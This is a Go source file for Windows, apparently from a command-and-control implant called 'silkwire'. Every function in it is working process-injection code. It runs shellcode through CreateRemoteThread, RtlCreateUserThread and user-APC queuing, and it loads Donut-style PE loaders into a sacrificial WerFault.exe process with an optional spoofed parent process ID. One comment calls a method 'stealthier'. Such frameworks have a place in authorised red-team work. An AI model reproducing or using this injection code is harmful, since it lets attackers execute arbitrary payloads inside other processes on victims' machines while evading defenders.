//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
	"unsafe"

	pb "silkwire/proto"

	"golang.org/x/sys/windows"
)

var (
	procRtlCreateUserThread = ntdll.NewProc("RtlCreateUserThread")
	procGetThreadId         = kernel32.NewProc("GetThreadId")
)

// ExecuteShellcode runs raw shellcode using the selected execution primitive.
// Supported methods:
//   - SELF: executes within the implant process (CreateRemoteThread on self)
//   - REMOTE: classic CreateRemoteThread injection into target PID
//   - RTL_CREATE_USER_THREAD: stealthier remote thread creation via ntdll
//   - USER_APC: queues APCs across target threads (requires alertable state)
func (i *Implant) ExecuteShellcode(shellcode []byte, options *pb.ExecuteShellcodeOptions) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no shellcode provided")
	}

	method := pb.ExecuteShellcodeOptions_SELF
	var pid uint32
	if options != nil {
		method = options.Method
		pid = options.Pid
	}

	switch method {
	case pb.ExecuteShellcodeOptions_SELF:
		return i.executeShellcodeSelf(shellcode)

	case pb.ExecuteShellcodeOptions_REMOTE:
		if pid == 0 {
			return nil, fmt.Errorf("remote execution method requires a target PID")
		}
		output, err := i.InjectShellcode(int(pid), shellcode)
		if err != nil {
			return nil, err
		}
		return rewriteShellcodeResult(output, map[string]interface{}{
			"method":        "create_remote_thread",
			"pid":           pid,
			"shellcode_len": len(shellcode),
		})

	case pb.ExecuteShellcodeOptions_RTL_CREATE_USER_THREAD:
		if pid == 0 {
			return nil, fmt.Errorf("rtlcreateuserthread method requires a target PID")
		}
		return i.injectShellcodeRtlCreateUserThread(int(pid), shellcode)

	case pb.ExecuteShellcodeOptions_USER_APC:
		if pid == 0 {
			return nil, fmt.Errorf("userapc method requires a target PID")
		}
		return i.injectShellcodeUserAPC(int(pid), shellcode)

	default:
		return nil, fmt.Errorf("unsupported shellcode execution method: %v", method)
	}
}

// executeShellcodeSelf runs shellcode inside the implant process by reusing the
// existing CreateRemoteThread injection helper against our own PID.
func (i *Implant) executeShellcodeSelf(shellcode []byte) ([]byte, error) {
	pid := windows.GetCurrentProcessId()

	output, err := i.InjectShellcode(int(pid), shellcode)
	if err != nil {
		return nil, err
	}

	return rewriteShellcodeResult(output, map[string]interface{}{
		"method":        "self",
		"pid":           pid,
		"shellcode_len": len(shellcode),
		"note":          "Shellcode executed inside implant process (CreateRemoteThread on self)",
	})
}

// injectShellcodeRtlCreateUserThread performs RtlCreateUserThread-based injection.
func (i *Implant) injectShellcodeRtlCreateUserThread(pid int, shellcode []byte) ([]byte, error) {
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := virtualAllocEx(hProcess, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	if err := writeProcessMemory(hProcess, addr, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode))); err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	var oldProtect uint32
	ret, _, protectErr := procVirtualProtectEx.Call(
		uintptr(hProcess),
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("VirtualProtectEx failed: %v", protectErr)
	}

	var hThread windows.Handle
	status, _, _ := procRtlCreateUserThread.Call(
		uintptr(hProcess),
		0,
		0,
		0,
		0,
		0,
		addr,
		0,
		uintptr(unsafe.Pointer(&hThread)),
		0,
	)
	if status != 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("RtlCreateUserThread failed: NTSTATUS 0x%x", status)
	}
	defer windows.CloseHandle(hThread)

	threadID := getThreadID(hThread)

	result := map[string]interface{}{
		"status":        "success",
		"method":        "rtlcreateuserthread",
		"pid":           pid,
		"thread_id":     threadID,
		"address":       fmt.Sprintf("0x%x", addr),
		"shellcode_len": len(shellcode),
	}

	return json.Marshal(result)
}

// injectShellcodeUserAPC queues APC callbacks across target threads.
func (i *Implant) injectShellcodeUserAPC(pid int, shellcode []byte) ([]byte, error) {
	hProcess, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("failed to open process %d: %v", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	addr, err := virtualAllocEx(hProcess, 0, len(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if err != nil {
		return nil, fmt.Errorf("VirtualAllocEx failed: %v", err)
	}

	if err := writeProcessMemory(hProcess, addr, unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode))); err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("WriteProcessMemory failed: %v", err)
	}

	var oldProtect uint32
	ret, _, protectErr := procVirtualProtectEx.Call(
		uintptr(hProcess),
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("VirtualProtectEx failed: %v", protectErr)
	}

	threadIDs, err := enumProcessThreads(pid)
	if err != nil {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, err
	}

	queued := 0
	for _, tid := range threadIDs {
		hThread, _, _ := procOpenThread.Call(
			THREAD_SET_CONTEXT,
			0,
			uintptr(tid),
		)
		if hThread == 0 {
			continue
		}

		ret, _, _ := procQueueUserAPC.Call(
			addr,
			hThread,
			0,
		)
		windows.CloseHandle(windows.Handle(hThread))

		if ret != 0 {
			queued++
		}
	}

	if queued == 0 {
		virtualFreeEx(hProcess, addr, 0, MEM_RELEASE)
		return nil, fmt.Errorf("failed to queue APC for PID %d (no alertable threads)", pid)
	}

	result := map[string]interface{}{
		"status":         "success",
		"method":         "user_apc",
		"pid":            pid,
		"queued_threads": queued,
		"total_threads":  len(threadIDs),
		"address":        fmt.Sprintf("0x%x", addr),
		"shellcode_len":  len(shellcode),
		"note":           "Shellcode executes when a queued thread enters an alertable state",
	}

	return json.Marshal(result)
}

// ExecutePE injects Donut-style PE loader shellcode into a sacrificial process.
func (i *Implant) ExecutePE(shellcode []byte, options *pb.ExecutePEOptions) ([]byte, error) {
	if len(shellcode) == 0 {
		return nil, fmt.Errorf("no PE loader shellcode provided")
	}

	spawnTo := "C:\\Windows\\System32\\WerFault.exe"
	if options != nil && options.SpawnTo != "" {
		spawnTo = options.SpawnTo
	}

	var cmdLine string
	if options != nil && options.Arguments != "" {
		cmdLine = fmt.Sprintf("\"%s\" %s", spawnTo, options.Arguments)
	} else {
		cmdLine = fmt.Sprintf("\"%s\"", spawnTo)
	}

	ppid := 0
	if options != nil {
		ppid = int(options.Ppid)
	}

	result, err := i.SpawnInjectAndWait(spawnTo, cmdLine, shellcode, ppid)
	if err != nil {
		return nil, fmt.Errorf("execute-pe failed: %v", err)
	}

	var resultMap map[string]interface{}
	if err := json.Unmarshal(result, &resultMap); err == nil {
		resultMap["command"] = "execute-pe"
		resultMap["spawn_to"] = spawnTo
		resultMap["command_line"] = cmdLine
		resultMap["shellcode_size"] = len(shellcode)
		if options != nil && options.Arguments != "" {
			resultMap["spawn_args"] = options.Arguments
		}
		if ppid != 0 {
			resultMap["ppid"] = ppid
		}
		return json.Marshal(resultMap)
	}

	return result, nil
}

// rewriteShellcodeResult merges additional metadata into JSON results.
func rewriteShellcodeResult(raw []byte, fields map[string]interface{}) ([]byte, error) {
	var result map[string]interface{}
	if err := json.Unmarshal(raw, &result); err != nil {
		// If parsing fails, return the original payload without error
		return raw, nil
	}

	for key, value := range fields {
		result[key] = value
	}

	return json.Marshal(result)
}

func getThreadID(thread windows.Handle) uint32 {
	ret, _, _ := procGetThreadId.Call(uintptr(thread))
	return uint32(ret)
}
